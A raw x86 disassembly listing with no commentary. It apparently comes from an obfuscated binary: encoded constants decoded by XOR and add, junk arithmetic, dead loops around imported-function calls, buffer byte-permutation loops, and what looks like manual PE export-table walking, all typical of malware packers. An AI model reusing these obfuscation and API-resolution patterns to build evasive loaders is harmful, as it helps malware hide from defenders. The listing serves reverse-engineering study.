  41aec0:	mov    esi,DWORD PTR [ebp+0x10]
  41aec3:	mov    edx,0x3272db
  41aec8:	add    eax,edx
  41aeca:	add    DWORD PTR ds:0x42b01c,0x428020
  41aed4:	mov    DWORD PTR [esi+0x4],eax
  41aed7:	mov    eax,DWORD PTR [ebp+0x14]
  41aeda:	mov    esi,DWORD PTR ds:0x428024
  41aee0:	sbb    esi,DWORD PTR ds:0x429010
  41aee6:	mov    DWORD PTR ds:0x428024,esi
  41aeec:	mov    esi,DWORD PTR [ebp+0x10]
  41aeef:	mov    DWORD PTR [esi+0x8],eax
  41aef2:	mov    eax,DWORD PTR [ebp+0x18]
  41aef5:	mov    esi,DWORD PTR [ebp+0x10]
  41aef8:	mov    DWORD PTR [esi+0xc],eax
  41aefb:	mov    eax,DWORD PTR [ebp+0x1c]
  41aefe:	mov    esi,DWORD PTR [ebp+0x10]
  41af01:	mov    DWORD PTR [esi+0x10],eax
  41af04:	mov    eax,DWORD PTR [ebp+0x8]
  41af07:	xor    eax,ecx
  41af09:	add    eax,edx
  41af0b:	pop    esi
  41af0c:	leave  
  41af0d:	ret    0x18
  41af10:	push   ebp
  41af11:	mov    ebp,esp
  41af13:	sub    esp,0x94
  41af19:	mov    eax,DWORD PTR [ebp+0x8]
  41af1c:	push   ebx
  41af1d:	neg    ecx
  41af1f:	push   esi
  41af20:	adc    esi,0x29b8
  41af26:	push   edi
  41af27:	or     edi,DWORD PTR ds:0x42b010
  41af2d:	mov    esi,0x7510893
  41af32:	or     ecx,ecx
  41af34:	xor    eax,esi
  41af36:	mov    edi,0x3272db
  41af3b:	add    eax,edi
  41af3d:	sub    DWORD PTR ds:0x42a018,0x772b
  41af47:	mov    DWORD PTR [ebp-0x38],eax
  41af4a:	mov    eax,ds:0x421aa6
  41af4f:	mov    ecx,DWORD PTR ds:0x428008
  41af55:	and    DWORD PTR ds:0x42b004,ecx
  41af5b:	mov    eax,DWORD PTR [eax]
  41af5d:	mov    DWORD PTR ds:0x42a01c,0x19
  41af67:	cmp    DWORD PTR ds:0x42a01c,0x0
  41af6e:	je     0x41afbe
  41af74:	cmp    DWORD PTR ds:0x42a01c,0x4
  41af7b:	jne    0x41af92
  41af81:	push   0x506a
  41af86:	push   DWORD PTR [ebp-0x24]
  41af89:	push   DWORD PTR [ebp-0x14]
  41af8c:	call   DWORD PTR ds:0x424028
  41af92:	cmp    DWORD PTR ds:0x42a01c,0x5
  41af99:	jne    0x41afac
  41af9f:	mov    ecx,DWORD PTR ds:0x42a01c
  41afa5:	dec    ecx
  41afa6:	mov    DWORD PTR ds:0x42a01c,ecx
  41afac:	mov    ecx,DWORD PTR ds:0x42a01c
  41afb2:	dec    ecx
  41afb3:	mov    DWORD PTR ds:0x42a01c,ecx
  41afb9:	jmp    0x41af67
  41afbe:	mov    DWORD PTR [ebp-0x24],eax
  41afc1:	add    DWORD PTR ds:0x428014,ecx
  41afc7:	mov    eax,ds:0x421cae
  41afcc:	mov    ecx,DWORD PTR ds:0x421a1e
  41afd2:	mov    ecx,DWORD PTR [ecx]
  41afd4:	adc    DWORD PTR ds:0x42a008,ecx
  41afda:	mov    eax,DWORD PTR [eax]
  41afdc:	and    DWORD PTR ds:0x42a01c,0x0
  41afe6:	jmp    0x41aff8
  41afeb:	mov    ecx,DWORD PTR ds:0x42a01c
  41aff1:	inc    ecx
  41aff2:	mov    DWORD PTR ds:0x42a01c,ecx
  41aff8:	cmp    DWORD PTR ds:0x42a01c,0x10
  41afff:	jae    0x41b0fe
  41b005:	cmp    DWORD PTR ds:0x42a01c,0x8
  41b00c:	jne    0x41b022
  41b012:	push   0x4238e2
  41b017:	push   0x423862
  41b01c:	call   DWORD PTR ds:0x424030
  41b022:	cmp    DWORD PTR ds:0x42a01c,0x7
  41b029:	jne    0x41b03e
  41b02f:	xor    ecx,ecx
  41b031:	xor    ecx,DWORD PTR ds:0x42a01c
  41b037:	inc    ecx
  41b038:	mov    DWORD PTR ds:0x42a01c,ecx
  41b03e:	jmp    0x41afeb
  41b043:	and    DWORD PTR ds:0x42901c,0x0
  41b04d:	jmp    0x41b05f
  41b052:	mov    ecx,DWORD PTR ds:0x42901c
  41b058:	inc    ecx
  41b059:	mov    DWORD PTR ds:0x42901c,ecx
  41b05f:	cmp    DWORD PTR ds:0x42901c,0x11
  41b066:	jae    0x41b0fe
  41b06c:	cmp    DWORD PTR ds:0x42901c,0x7
  41b073:	jne    0x41b099
  41b079:	push   DWORD PTR [ebp-0x10]
  41b07c:	push   DWORD PTR [ebp-0x18]
  41b07f:	push   0x2cae
  41b084:	push   0x19d0
  41b089:	push   0x7b35
  41b08e:	push   0x42c01c
  41b093:	call   DWORD PTR ds:0x424038
  41b099:	cmp    DWORD PTR ds:0x42901c,0x6
  41b0a0:	jne    0x41b0b3
  41b0a6:	mov    ecx,DWORD PTR ds:0x42901c
  41b0ac:	inc    ecx
  41b0ad:	mov    DWORD PTR ds:0x42901c,ecx
  41b0b3:	jmp    0x41b052
  41b0b8:	mov    DWORD PTR ds:0x42c00c,0x11
  41b0c2:	cmp    DWORD PTR ds:0x42c00c,0x0
  41b0c9:	je     0x41b0fe
  41b0cf:	cmp    DWORD PTR ds:0x42c00c,0x18
  41b0d6:	jne    0x41b0ec
  41b0dc:	push   0x42a008
  41b0e1:	push   0x6229
  41b0e6:	call   DWORD PTR ds:0x42403c
  41b0ec:	mov    ecx,DWORD PTR ds:0x42c00c
  41b0f2:	dec    ecx
  41b0f3:	mov    DWORD PTR ds:0x42c00c,ecx
  41b0f9:	jmp    0x41b0c2
  41b0fe:	mov    DWORD PTR [ebp-0x28],eax
  41b101:	mov    DWORD PTR [ebp-0x34],0xf89c87b6
  41b108:	mov    eax,DWORD PTR [ebp-0x34]
  41b10b:	xor    eax,esi
  41b10d:	add    eax,edi
  41b10f:	sbb    DWORD PTR ds:0x42a000,0x3656
  41b119:	mov    DWORD PTR [ebp-0x38],eax
  41b11c:	mov    eax,ds:0x421c26
  41b121:	mov    DWORD PTR [ebp-0x38],eax
  41b124:	or     eax,0x6382
  41b129:	mov    eax,DWORD PTR [ebp-0x24]
  41b12c:	and    DWORD PTR ds:0x42a008,0x0
  41b136:	mov    ecx,DWORD PTR ds:0x42a008
  41b13c:	inc    ecx
  41b13d:	mov    DWORD PTR ds:0x42a008,ecx
  41b143:	cmp    DWORD PTR ds:0x42a008,0x9
  41b14a:	jne    0x41b15e
  41b150:	push   DWORD PTR [ebp-0x14]
  41b153:	push   0x42383d
  41b158:	call   DWORD PTR ds:0x424040
  41b15e:	cmp    DWORD PTR ds:0x42a008,0x8
  41b165:	jne    0x41b17a
  41b16b:	xor    ecx,ecx
  41b16d:	add    ecx,DWORD PTR ds:0x42a008
  41b173:	inc    ecx
  41b174:	mov    DWORD PTR ds:0x42a008,ecx
  41b17a:	cmp    DWORD PTR ds:0x42a008,0x17
  41b181:	jb     0x41b136
  41b187:	mov    DWORD PTR [ebp-0x14],eax
  41b18a:	mov    eax,DWORD PTR [ebp-0x14]
  41b18d:	dec    DWORD PTR ds:0x42c000
  41b193:	push   0x4
  41b195:	and    ecx,DWORD PTR ds:0x42a018
  41b19b:	pop    ecx
  41b19c:	sbb    DWORD PTR ds:0x42b000,0x429004
  41b1a6:	sub    ecx,eax
  41b1a8:	xor    DWORD PTR ds:0x42a01c,0x102e
  41b1b2:	add    ecx,DWORD PTR [ebp-0x28]
  41b1b5:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  41b1bc:	adc    eax,0x5aaa
  41b1c1:	mov    DWORD PTR [ebp-0x20],ecx
  41b1c4:	mov    DWORD PTR [ebp-0x94],0xf89c85ba
  41b1ce:	and    DWORD PTR ds:0x428010,0x0
  41b1d8:	jmp    0x41b1eb
  41b1dd:	xor    eax,eax
  41b1df:	add    eax,DWORD PTR ds:0x428010
  41b1e5:	inc    eax
  41b1e6:	mov    ds:0x428010,eax
  41b1eb:	cmp    DWORD PTR ds:0x428010,0x10
  41b1f2:	jae    0x41b22d
  41b1f8:	cmp    DWORD PTR ds:0x428010,0x9
  41b1ff:	jne    0x41b210
  41b205:	push   0x423854
  41b20a:	call   DWORD PTR ds:0x424044
  41b210:	cmp    DWORD PTR ds:0x428010,0x8
  41b217:	jne    0x41b228
  41b21d:	mov    eax,ds:0x428010
  41b222:	inc    eax
  41b223:	mov    ds:0x428010,eax
  41b228:	jmp    0x41b1dd
  41b22d:	mov    eax,DWORD PTR [ebp-0x14]
  41b230:	sbb    DWORD PTR ds:0x42a018,0x429014
  41b23a:	mov    DWORD PTR [ebp-0x90],eax
  41b240:	dec    eax
  41b241:	mov    eax,DWORD PTR [ebp-0x20]
  41b244:	mov    DWORD PTR [ebp-0x8c],eax
  41b24a:	add    DWORD PTR ds:0x42c00c,0x20f
  41b254:	mov    eax,DWORD PTR [ebp-0x2c]
  41b257:	xor    DWORD PTR ds:0x42b00c,0x3fc9
  41b261:	xor    eax,esi
  41b263:	add    eax,edi
  41b265:	mov    DWORD PTR [ebp-0x88],eax
  41b26b:	lea    eax,[ebp-0x50]
  41b26e:	or     DWORD PTR ds:0x42b014,0x1a32
  41b278:	mov    DWORD PTR [ebp-0x84],eax
  41b27e:	mov    eax,DWORD PTR [ebp-0x94]
  41b284:	xor    DWORD PTR ds:0x42b010,0x42a00c
  41b28e:	xor    eax,esi
  41b290:	xor    DWORD PTR ds:0x42900c,0x429018
  41b29a:	add    eax,edi
  41b29c:	and    DWORD PTR ds:0x428020,0x42c01c
  41b2a6:	mov    DWORD PTR [ebp-0x94],eax
  41b2ac:	and    DWORD PTR ds:0x42a000,0x429010
  41b2b6:	lea    eax,[ebp-0x94]
  41b2bc:	adc    DWORD PTR ds:0x42b018,0x42c018
  41b2c6:	push   eax
  41b2c7:	movzx  eax,WORD PTR ds:0x42b01c
  41b2ce:	add    DWORD PTR ds:0x42a008,eax
  41b2d4:	mov    eax,DWORD PTR [ebp+0xc]
  41b2d7:	xor    eax,esi
  41b2d9:	add    DWORD PTR ds:0x428028,0x2102
  41b2e3:	add    eax,edi
  41b2e5:	sub    DWORD PTR ds:0x429010,0x36a
  41b2ef:	push   eax
  41b2f0:	mov    eax,ds:0x421c46
  41b2f5:	adc    DWORD PTR ds:0x428024,0x6674
  41b2ff:	push   0x421b9c
  41b304:	and    DWORD PTR ds:0x42a014,0x6ed
  41b30e:	push   DWORD PTR [eax]
  41b310:	add    DWORD PTR ds:0x42a000,0x42900c
  41b31a:	call   0x405c89
  41b31f:	or     eax,DWORD PTR ds:0x42901c
  41b325:	mov    eax,DWORD PTR [ebp-0x14]
  41b328:	and    ecx,0x4079
  41b32e:	mov    ecx,DWORD PTR [ebp-0x20]
  41b331:	sub    DWORD PTR ds:0x42b01c,0xab5
  41b33b:	mov    DWORD PTR [ebp-0x44],ecx
  41b33e:	sbb    DWORD PTR ds:0x42b01c,edi
  41b344:	mov    ecx,DWORD PTR [ebp+0x8]
  41b347:	xor    ecx,esi
  41b349:	add    DWORD PTR ds:0x42a018,0x42a000
  41b353:	mov    DWORD PTR [ebp-0x34],eax
  41b356:	add    ecx,edi
  41b358:	jmp    0x41b6c6
  41b35d:	sub    DWORD PTR ds:0x42a018,edi
  41b363:	lea    edx,[ecx+eax*1]
  41b366:	mov    DWORD PTR [ebp-0x28],edx
  41b369:	mov    edx,DWORD PTR [ebp-0x44]
  41b36c:	mov    ebx,DWORD PTR ds:0x429004
  41b372:	add    DWORD PTR ds:0x42c008,ebx
  41b378:	sub    edx,ecx
  41b37a:	mov    DWORD PTR ds:0x42b004,0x1e
  41b384:	cmp    DWORD PTR ds:0x42b004,0x0
  41b38b:	je     0x41b3c5
  41b391:	cmp    DWORD PTR ds:0x42b004,0x28
  41b398:	jne    0x41b3b3
  41b39e:	push   0x3a6a
  41b3a3:	push   0x42b010
  41b3a8:	push   0x4239b2
  41b3ad:	call   DWORD PTR ds:0x424048
  41b3b3:	mov    ebx,DWORD PTR ds:0x42b004
  41b3b9:	dec    ebx
  41b3ba:	mov    DWORD PTR ds:0x42b004,ebx
  41b3c0:	jmp    0x41b384
  41b3c5:	mov    DWORD PTR [ebp-0x24],edx
  41b3c8:	mov    edx,DWORD PTR [ebp-0x24]
  41b3cb:	and    DWORD PTR ds:0x428008,edi
  41b3d1:	mov    DWORD PTR [ebp-0x14],edx
  41b3d4:	not    edx
  41b3d6:	mov    edx,DWORD PTR [ebp-0x28]
  41b3d9:	mov    DWORD PTR ds:0x42800c,0x11
  41b3e3:	cmp    DWORD PTR ds:0x42800c,0x0
  41b3ea:	je     0x41b499
  41b3f0:	cmp    DWORD PTR ds:0x42800c,0x8
  41b3f7:	jne    0x41b40b
  41b3fd:	push   0x42a010
  41b402:	push   DWORD PTR [ebp-0x28]
  41b405:	call   DWORD PTR ds:0x424014
  41b40b:	cmp    DWORD PTR ds:0x42800c,0x9
  41b412:	jne    0x41b425
  41b418:	mov    ebx,DWORD PTR ds:0x42800c
  41b41e:	dec    ebx
  41b41f:	mov    DWORD PTR ds:0x42800c,ebx
  41b425:	xor    ebx,ebx
  41b427:	or     ebx,DWORD PTR ds:0x42800c
  41b42d:	dec    ebx
  41b42e:	mov    DWORD PTR ds:0x42800c,ebx
  41b434:	jmp    0x41b3e3
  41b439:	mov    DWORD PTR ds:0x429004,0x17
  41b443:	cmp    DWORD PTR ds:0x429004,0x0
  41b44a:	je     0x41b499
  41b450:	cmp    DWORD PTR ds:0x429004,0x25
  41b457:	jne    0x41b485
  41b45d:	push   0x85b6
  41b462:	push   0x42a018
  41b467:	push   DWORD PTR [ebp-0x24]
  41b46a:	push   0x42c000
  41b46f:	push   0x5138
  41b474:	push   DWORD PTR [ebp-0x24]
  41b477:	push   0x4b55
  41b47c:	push   DWORD PTR [ebp-0x24]
  41b47f:	call   DWORD PTR ds:0x424018
  41b485:	xor    ebx,ebx
  41b487:	add    ebx,DWORD PTR ds:0x429004
  41b48d:	dec    ebx
  41b48e:	mov    DWORD PTR ds:0x429004,ebx
  41b494:	jmp    0x41b443
  41b499:	mov    DWORD PTR [ebp-0x3c],0xf89c85b6
  41b4a0:	mov    DWORD PTR [ebp-0x40],edx
  41b4a3:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  41b4aa:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4ad:	xor    edx,esi
  41b4af:	add    edx,edi
  41b4b1:	mov    DWORD PTR [ebp-0x10],edx
  41b4b4:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4b7:	xor    edx,esi
  41b4b9:	add    edx,edi
  41b4bb:	mov    DWORD PTR [ebp-0x8],edx
  41b4be:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41b4c5:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  41b4cc:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4cf:	mov    ebx,DWORD PTR [ebp-0x14]
  41b4d2:	xor    edx,esi
  41b4d4:	add    edx,edi
  41b4d6:	cmp    ebx,edx
  41b4d8:	je     0x41b6ba
  41b4de:	mov    eax,DWORD PTR [ebp-0x18]
  41b4e1:	xor    eax,esi
  41b4e3:	mov    edx,0xffcd8d25
  41b4e8:	sub    edx,eax
  41b4ea:	add    edx,DWORD PTR [ebp-0x14]
  41b4ed:	mov    eax,DWORD PTR [ebp-0x18]
  41b4f0:	mov    ebx,DWORD PTR [ebp-0x10]
  41b4f3:	xor    eax,esi
  41b4f5:	add    eax,edi
  41b4f7:	imul   eax,ebx
  41b4fa:	cmp    eax,edx
  41b4fc:	ja     0x41b6b7
  41b502:	mov    edx,DWORD PTR [ebp-0x10]
  41b505:	mov    eax,DWORD PTR [ebp-0x14]
  41b508:	mov    ebx,DWORD PTR [ebp-0x28]
  41b50b:	sub    eax,edx
  41b50d:	xor    ebx,esi
  41b50f:	xor    edx,edx
  41b511:	add    ebx,edi
  41b513:	div    ebx
  41b515:	mov    DWORD PTR [ebp-0x8],eax
  41b518:	mov    eax,DWORD PTR [ebp-0x2c]
  41b51b:	mov    edx,DWORD PTR [ebp-0x8]
  41b51e:	xor    eax,esi
  41b520:	add    eax,edi
  41b522:	cmp    edx,eax
  41b524:	jbe    0x41b534
  41b52a:	mov    eax,DWORD PTR [ebp-0x2c]
  41b52d:	xor    eax,esi
  41b52f:	add    eax,edi
  41b531:	mov    DWORD PTR [ebp-0x8],eax
  41b534:	mov    eax,DWORD PTR [ebp-0x28]
  41b537:	mov    edx,DWORD PTR [ebp-0x8]
  41b53a:	xor    eax,esi
  41b53c:	add    eax,edi
  41b53e:	imul   eax,edx
  41b541:	mov    DWORD PTR [ebp-0x8],eax
  41b544:	mov    eax,DWORD PTR [ebp-0x3c]
  41b547:	mov    edx,DWORD PTR [ebp-0x8]
  41b54a:	xor    eax,esi
  41b54c:	add    eax,edi
  41b54e:	cmp    edx,eax
  41b550:	je     0x41b6a0
  41b556:	mov    eax,DWORD PTR [ebp-0x8]
  41b559:	mov    DWORD PTR [ebp-0x20],eax
  41b55c:	mov    eax,DWORD PTR [ebp-0x10]
  41b55f:	add    eax,DWORD PTR [ebp-0x40]
  41b562:	mov    DWORD PTR [ebp-0x24],0xf89c85b6
  41b569:	mov    DWORD PTR [ebp-0x8],eax
  41b56c:	mov    eax,0xf89c85b5
  41b571:	mov    DWORD PTR [ebp-0x1c],eax
  41b574:	mov    DWORD PTR [ebp-0x38],0xf89c85b4
  41b57b:	mov    DWORD PTR [ebp-0x30],eax
  41b57e:	mov    eax,DWORD PTR [ebp-0x24]
  41b581:	xor    eax,esi
  41b583:	add    eax,edi
  41b585:	jmp    0x41b654
  41b58a:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41b591:	mov    DWORD PTR [ebp-0x4c],0xf89c85a7
  41b598:	mov    eax,DWORD PTR [ebp-0x30]
  41b59b:	mov    edx,DWORD PTR [ebp-0xc]
  41b59e:	xor    eax,esi
  41b5a0:	add    eax,edi
  41b5a2:	imul   eax,edx
  41b5a5:	mov    edx,DWORD PTR [ebp-0x1c]
  41b5a8:	xor    edx,esi
  41b5aa:	add    eax,edx
  41b5ac:	mov    edx,DWORD PTR [ebp-0x8]
  41b5af:	mov    al,BYTE PTR [eax+edx*1+0x3272db]
  41b5b6:	mov    BYTE PTR [ebp-0x1],al
  41b5b9:	mov    eax,DWORD PTR [ebp-0x1c]
  41b5bc:	mov    edx,DWORD PTR [ebp-0x1c]
  41b5bf:	xor    eax,esi
  41b5c1:	xor    edx,esi
  41b5c3:	lea    ebx,[eax+edx*1+0x64e5b6]
  41b5ca:	mov    eax,DWORD PTR [ebp-0xc]
  41b5cd:	xor    edx,edx
  41b5cf:	div    ebx
  41b5d1:	mov    eax,DWORD PTR [ebp-0x1c]
  41b5d4:	xor    eax,esi
  41b5d6:	add    eax,edi
  41b5d8:	cmp    edx,eax
  41b5da:	mov    eax,DWORD PTR [ebp-0x30]
  41b5dd:	mov    edx,DWORD PTR [ebp-0xc]
  41b5e0:	jne    0x41b5fc
  41b5e6:	xor    eax,esi
  41b5e8:	add    eax,edi
  41b5ea:	imul   eax,edx
  41b5ed:	mov    edx,DWORD PTR [ebp-0x8]
  41b5f0:	movzx  eax,BYTE PTR [eax+edx*1]
  41b5f4:	mov    edx,DWORD PTR [ebp-0x48]
  41b5f7:	jmp    0x41b60d
  41b5fc:	xor    eax,esi
  41b5fe:	add    eax,edi
  41b600:	imul   eax,edx
  41b603:	mov    edx,DWORD PTR [ebp-0x8]
  41b606:	movzx  eax,BYTE PTR [eax+edx*1]
  41b60a:	mov    edx,DWORD PTR [ebp-0x4c]
  41b60d:	xor    edx,esi
  41b60f:	lea    eax,[edx+eax*1+0x3272db]
  41b616:	movzx  edx,BYTE PTR [ebp-0x1]
  41b61a:	xor    edx,eax
  41b61c:	mov    BYTE PTR [ebp-0x1],dl
  41b61f:	mov    al,BYTE PTR [ebp-0x1]
  41b622:	mov    edx,DWORD PTR [ebp-0x30]
  41b625:	mov    ebx,DWORD PTR [ebp-0xc]
  41b628:	xor    edx,esi
  41b62a:	add    edx,edi
  41b62c:	imul   edx,ebx
  41b62f:	mov    ebx,DWORD PTR [ebp-0x1c]
  41b632:	xor    ebx,esi
  41b634:	add    edx,ebx
  41b636:	mov    ebx,DWORD PTR [ebp-0x8]
  41b639:	mov    BYTE PTR [edx+ebx*1+0x3272db],al
  41b640:	mov    eax,DWORD PTR [ebp-0x38]
  41b643:	mov    edx,DWORD PTR [ebp-0x1c]
  41b646:	xor    eax,esi
  41b648:	xor    edx,esi
  41b64a:	add    eax,edi
  41b64c:	add    edx,edi
  41b64e:	imul   eax,edx
  41b651:	add    eax,DWORD PTR [ebp-0xc]
  41b654:	mov    DWORD PTR [ebp-0xc],eax
  41b657:	mov    eax,DWORD PTR [ebp-0xc]
  41b65a:	mov    edx,DWORD PTR [ebp-0x20]
  41b65d:	sub    eax,edi
  41b65f:	sub    edx,edi
  41b661:	xor    eax,esi
  41b663:	xor    edx,esi
  41b665:	cmp    edx,eax
  41b667:	jne    0x41b58a
  41b66d:	mov    eax,DWORD PTR [ebp-0x1c]
  41b670:	mov    edx,DWORD PTR [ebp-0x20]
  41b673:	xor    eax,esi
  41b675:	add    eax,edi
  41b677:	imul   eax,edx
  41b67a:	mov    edx,DWORD PTR [ebp-0x24]
  41b67d:	xor    edx,esi
  41b67f:	add    edx,edi
  41b681:	or     eax,edx
  41b683:	mov    edx,DWORD PTR [ebp-0x18]
  41b686:	xor    edx,esi
  41b688:	add    eax,edx
  41b68a:	mov    edx,DWORD PTR [ebp-0x18]
  41b68d:	xor    edx,esi
  41b68f:	add    eax,edx
  41b691:	mov    edx,DWORD PTR [ebp-0x10]
  41b694:	lea    eax,[eax+edx*1+0x64e5b6]
  41b69b:	jmp    0x41b6af
  41b6a0:	mov    eax,DWORD PTR [ebp-0x18]
  41b6a3:	mov    edx,DWORD PTR [ebp-0x10]
  41b6a6:	xor    eax,esi
  41b6a8:	lea    eax,[eax+edx*1+0x3272db]
  41b6af:	mov    DWORD PTR [ebp-0x10],eax
  41b6b2:	jmp    0x41b4de
  41b6b7:	mov    eax,DWORD PTR [ebp-0x34]
  41b6ba:	mov    edx,DWORD PTR [ebp+0xc]
  41b6bd:	xor    edx,esi
  41b6bf:	lea    ecx,[ecx+edx*1+0x3272db]
  41b6c6:	lea    edx,[ecx-0x3272db]
  41b6cc:	xor    edx,esi
  41b6ce:	cmp    edx,0xf89c95b6
  41b6d4:	jne    0x41b35d
  41b6da:	mov    ecx,DWORD PTR [ebp+0x8]
  41b6dd:	mov    edx,DWORD PTR [ebp+0xc]
  41b6e0:	mov    ebx,DWORD PTR [ebp+0x8]
  41b6e3:	xor    edx,esi
  41b6e5:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  41b6ec:	xor    ecx,esi
  41b6ee:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41b6f5:	xor    ebx,esi
  41b6f7:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  41b6fe:	mov    edx,DWORD PTR [ebp+0xc]
  41b701:	xor    edx,esi
  41b703:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  41b70a:	mov    eax,DWORD PTR [ebp+0xc]
  41b70d:	xor    eax,esi
  41b70f:	add    eax,edi
  41b711:	pop    edi
  41b712:	pop    esi
  41b713:	pop    ebx
  41b714:	leave  
  41b715:	ret    0x8
  41b718:	push   ebp
  41b719:	mov    ebp,esp
  41b71b:	mov    DWORD PTR ds:0x421d36,0xf89c85b5
  41b725:	pop    ebp
  41b726:	jmp    0x41b89a
  41b72b:	push   ebp
  41b72c:	mov    ebp,esp
  41b72e:	push   ecx
  41b72f:	and    DWORD PTR ds:0x42c010,0x0
  41b739:	jmp    0x41b74b
  41b73e:	mov    edx,DWORD PTR ds:0x42c010
  41b744:	inc    edx
  41b745:	mov    DWORD PTR ds:0x42c010,edx
  41b74b:	cmp    DWORD PTR ds:0x42c010,0x19
  41b752:	jae    0x41b793
  41b758:	cmp    DWORD PTR ds:0x42c010,0x9
  41b75f:	jne    0x41b76e
  41b765:	push   DWORD PTR [ebp-0x18]
  41b768:	call   DWORD PTR ds:0x42401c
  41b76e:	cmp    DWORD PTR ds:0x42c010,0x8
  41b775:	jne    0x41b788
  41b77b:	mov    edx,DWORD PTR ds:0x42c010
  41b781:	inc    edx
  41b782:	mov    DWORD PTR ds:0x42c010,edx
  41b788:	jmp    0x41b73e
  41b78d:	or     DWORD PTR ds:0x42c004,ebx
  41b793:	push   ecx
  41b794:	movzx  eax,BYTE PTR ds:0x42b00c
  41b79b:	and    DWORD PTR ds:0x42a01c,eax
  41b7a1:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  41b7a8:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  41b7af:	mov    DWORD PTR ds:0x428008,0x13
  41b7b9:	cmp    DWORD PTR ds:0x428008,0x0
  41b7c0:	je     0x41b7ef
  41b7c6:	cmp    DWORD PTR ds:0x428008,0x20
  41b7cd:	jne    0x41b7df
  41b7d3:	push   DWORD PTR [ebp-0x14]
  41b7d6:	push   DWORD PTR [ebp-0x1c]
  41b7d9:	call   DWORD PTR ds:0x424020
  41b7df:	mov    eax,ds:0x428008
  41b7e4:	dec    eax
  41b7e5:	mov    ds:0x428008,eax
  41b7ea:	jmp    0x41b7b9
  41b7ef:	mov    eax,DWORD PTR [ebp-0x4]
  41b7f2:	and    DWORD PTR ds:0x429008,0x428020
  41b7fc:	push   esi
  41b7fd:	adc    DWORD PTR ds:0x42c000,0x1310
  41b807:	mov    esi,DWORD PTR [ebp-0x8]
  41b80a:	mov    edx,0x7510893
  41b80f:	xor    eax,edx
  41b811:	mov    ecx,DWORD PTR ds:0x42a000
  41b817:	and    DWORD PTR ds:0x429014,ecx
  41b81d:	xor    esi,edx
  41b81f:	mov    ecx,DWORD PTR ds:0x423b01
  41b825:	mov    ecx,DWORD PTR [ecx]
  41b827:	sbb    DWORD PTR ds:0x42b00c,ecx
  41b82d:	mov    ecx,0x3272db
  41b832:	add    esi,ecx
  41b834:	add    eax,ecx
  41b836:	imul   eax,esi
  41b839:	mov    esi,DWORD PTR [ebp+0xc]
  41b83c:	cmp    esi,eax
  41b83e:	jne    0x41b85a
  41b844:	mov    eax,DWORD PTR [ebp-0x4]
  41b847:	mov    esi,DWORD PTR [ebp-0x8]
  41b84a:	xor    eax,edx
  41b84c:	xor    esi,edx
  41b84e:	add    eax,ecx
  41b850:	add    esi,ecx
  41b852:	imul   eax,esi
  41b855:	jmp    0x41b895
  41b85a:	mov    eax,DWORD PTR [ebp+0xc]
  41b85d:	mov    eax,DWORD PTR [eax+0x78]
  41b860:	mov    DWORD PTR [ebp+0xc],eax
  41b863:	mov    eax,DWORD PTR [ebp-0x4]
  41b866:	mov    esi,DWORD PTR [ebp-0x8]
  41b869:	xor    eax,edx
  41b86b:	xor    esi,edx
  41b86d:	add    eax,ecx
  41b86f:	add    esi,ecx
  41b871:	imul   eax,esi
  41b874:	mov    esi,DWORD PTR [ebp+0xc]
  41b877:	cmp    esi,eax
  41b879:	mov    eax,DWORD PTR [ebp-0x4]
  41b87c:	je     0x41b847
  41b882:	xor    eax,edx
  41b884:	add    eax,ecx
  41b886:	mov    ecx,DWORD PTR [ebp+0xc]
  41b889:	imul   eax,ecx
  41b88c:	add    eax,DWORD PTR [ebp+0x8]
  41b88f:	mov    DWORD PTR [ebp+0xc],eax
  41b892:	mov    eax,DWORD PTR [ebp+0xc]
  41b895:	pop    esi
  41b896:	leave  
  41b897:	ret    0x8
  41b89a:	push   ebp
  41b89b:	mov    ebp,esp
  41b89d:	sub    esp,0x80
  41b8a3:	push   ebx
  41b8a4:	push   esi
  41b8a5:	push   edi
  41b8a6:	mov    DWORD PTR ds:0x42c010,0xf9a
  41b8b0:	mov    DWORD PTR [ebp-0x3c],0x0
  41b8b7:	dec    eax
  41b8b8:	mov    eax,DWORD PTR [ebp-0x18]
  41b8bb:	mov    DWORD PTR [ebp-0x18],eax
  41b8be:	adc    DWORD PTR ds:0x429014,0x42801c
  41b8c8:	push   0x421d3a
  41b8cd:	call   DWORD PTR ds:0x42402c
  41b8d3:	adc    DWORD PTR ds:0x428018,0x3fb
  41b8dd:	push   0x0
  41b8df:	push   0x67
  41b8e1:	sbb    DWORD PTR ds:0x42b008,0x4024
  41b8eb:	push   0xc
  41b8ed:	mov    DWORD PTR ds:0x429000,0x5718
  41b8f7:	push   0x3
  41b8f9:	and    DWORD PTR ds:0x42b004,0x67ab
  41b903:	push   0x2
  41b905:	push   0x78769798
  41b90a:	or     DWORD PTR ds:0x428024,0x42c014
  41b914:	call   DWORD PTR ds:0x42400c
  41b91a:	or     DWORD PTR ds:0x42c000,0x429014
  41b924:	push   0x57658733
  41b929:	and    DWORD PTR ds:0x42c000,0x42900c
  41b933:	call   DWORD PTR ds:0x424008
  41b939:	push   0x97667654
  41b93e:	call   DWORD PTR ds:0x424000
  41b944:	movzx  eax,BYTE PTR ds:0x428004
  41b94b:	mov    eax,DWORD PTR [ebp-0x18]
  41b94e:	cmp    eax,0xf89c85b6
  41b953:	mov    DWORD PTR ds:0x42c018,0x6f46
  41b95d:	jne    0x41ba3b
  41b963:	sub    DWORD PTR ds:0x42b018,0x42901c
  41b96d:	xor    edi,edi
  41b96f:	inc    edi
  41b970:	xor    esi,esi
  41b972:	inc    esi
  41b973:	mov    DWORD PTR ds:0x429018,0x36e4
  41b97d:	mov    DWORD PTR ds:0x421d36,0xf89c85b5
  41b987:	mov    DWORD PTR ds:0x42c004,0x59b7
  41b991:	cmp    edi,0x20
  41b994:	mov    DWORD PTR ds:0x42c000,0x70dd
  41b99e:	jne    0x41ba00
  41b9a4:	mov    DWORD PTR ds:0x428000,0x41f9
  41b9ae:	cmp    esi,edi
